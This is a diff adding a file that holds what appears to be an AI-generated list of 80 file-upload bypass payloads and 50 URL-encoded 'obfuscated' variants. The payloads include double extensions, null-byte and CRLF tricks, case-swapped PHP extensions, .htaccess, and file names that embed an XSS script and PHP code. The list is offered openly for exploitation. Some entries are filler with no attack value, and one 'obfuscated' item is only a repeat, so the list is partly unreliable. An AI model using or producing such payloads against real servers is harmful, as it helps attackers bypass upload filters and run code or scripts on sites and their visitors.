@@ -1,0 +1,137 @@
+Okay, here are 80 payloads for exploiting File Upload Vulnerabilities followed by 50 obfuscated versions:
+
+**Original Payloads (1-80)**
+
+1.  `test.php`
+2.  `test.php5`
+3.  `test.phtml`
+4.  `test.inc`
+5.  `test.htaccess`
+6.  `test.jpg.php`
+7.  `test.png.php`
+8.  `test.gif.php`
+9.  `test.php;.jpg`
+10. `test.php%00.jpg`
+11. `test.php\x00.jpg`
+12. `test.php%0d%0a.jpg`
+13. `<script>alert("XSS");</script>.jpg`
+14. `<?php phpinfo(); ?>.jpg`
+15. `test.PHP`
+16. `test.Php`
+17. `test.pHp`
+18. `test.phP`
+19. `test.PhP`
+20. `test.PHP5`
+21. `test.PHp5`
+22. `test.pHp5`
+23. `test.phP5`
+24. `test.PhP5`
+25. `test.pht`
+26. `test.pHt`
+27. `test.phT`
+28. `test.PhT`
+29. `test.phtm`
+30. `test.pHtm`
+31. `test.phTm`
+32. `test.PhTm`
+33. `test.asp`
+34. `test.aspx`
+35. `test.cer`
+36. `test.asa`
+37. `test.jsp`
+38. `test.jspx`
+39. `test.action`
+40. `test.swf`
+41. `test.svg`
+42. `test.xml`
+43. `test.xhtml`
+44. `test.tpl`
+45. `.htaccess`
+46. `test.config`
+47. `test.ini`
+48. `test.log`
+49. `test.sh`
+50. `test.bash`
+51. `test.exe`
+52. `test.dll`
+53. `test.jar`
+54. `test.py`
+55. `test.rb`
+56. `test.pl`
+57. `test.cfm`
+58. `test.cfc`
+59. `test.js`
+60. `test.json`
+61. `test.txt`
+62. `test.pdf`
+63. `test.doc`
+64. `test.docx`
+65. `test.xls`
+66. `test.xlsx`
+67. `test.zip`
+68. `test.rar`
+69. `test.tar.gz`
+70. `test.tar.bz2`
+71. `test.tar`
+72. `test.sql`
+73. `test.backup`
+74. `test.old`
+75. `test.bak`
+76. `test.tmp`
+77. `test.xxx`
+78. `test.htpasswd`
+79. `test.htgroup`
+80. `test.env`
+
+**Obfuscated Payloads (1-50)**
+
+1.  `test%2ephp` - URL Encoding
+2.  `test.ph%70` - URL Encoding
+3.  `test%2ephtml` - URL Encoding
+4.  `test.i%6ec` - URL Encoding
+5.  `.ht%61ccess` - URL Encoding
+6.  `test.jpg%2ep%68p` - URL Encoding
+7.  `test.png.p%68p` - URL Encoding
+8.  `test.gif%2ep%68p` - URL Encoding
+9.  `test.php%3b.jpg` - URL Encoding
+10. `test.php%2500.jpg` - URL Encoding
+11. `test.php%00.jpg` - URL Encoding
+12. `test.php%250d%250a.jpg` - URL Encoding
+13. `%3cscript%3ealert%28%22XSS%22%29%3c%2fscript%3e.jpg` - URL Encoding
+14. `%3c%3fphp%20phpinfo%28%29%3b%20%3f%3e.jpg` - URL Encoding
+15. `test%2ePHP` - URL Encoding
+16. `test.Ph%70` - URL Encoding
+17. `test%2epHp` - URL Encoding
+18. `test.pH%70` - URL Encoding
+19. `test.ph%50` - URL Encoding
+20. `test%2ePHP5` - URL Encoding
+21. `test.PH%705` - URL Encoding
+22. `test.p%48p5` - URL Encoding
+23. `test.ph%505` - URL Encoding
+24. `test.Ph%505` - URL Encoding
+25. `test%2epht` - URL Encoding
+26. `test%2epHt` - URL Encoding
+27. `test.pH%54` - URL Encoding
+28. `test.ph%54` - URL Encoding
+29. `test%2ephtm` - URL Encoding
+30. `test.pH%74m` - URL Encoding
+31. `test.phT%6d` - URL Encoding
+32. `test.PhT%6d` - URL Encoding
+33. `test%2easp` - URL Encoding
+34. `test.as%70x` - URL Encoding
+35. `test%2ecer` - URL Encoding
+36. `test.as%61` - URL Encoding
+37. `test%2ejsp` - URL Encoding
+38. `test.js%70x` - URL Encoding
+39. `test.a%63tion` - URL Encoding
+40. `test%2eswf` - URL Encoding
+41. `test.sv%67` - URL Encoding
+42. `test%2exml` - URL Encoding
+43. `test.xh%74ml` - URL Encoding
+44. `test%2etpl` - URL Encoding
+45. `%2ehtaccess` - URL Encoding
+46. `test.confi%67` - URL Encoding
+47. `test.i%6e%69` - URL Encoding
+48. `test.lo%67` - URL Encoding
+49. `test.s%68` - URL Encoding
+50. `test%2ebash` - URL Encoding
